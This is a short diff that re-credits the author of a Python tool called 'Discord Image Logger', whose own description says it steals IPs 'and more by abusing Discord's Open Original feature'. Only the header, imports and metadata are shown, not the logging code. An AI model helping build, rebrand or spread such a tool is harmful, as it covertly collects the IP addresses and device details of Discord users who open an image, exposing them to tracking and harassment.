@@ -1,6 +1,6 @@
 
 # Image Logger
-# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC
+# Hypix https://github.com/hypix22?tab=repositories
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -9,7 +9,7 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "C00lB0i"
+__author__ = "Hypix"
 
 config = {
     # BASE CONFIG #
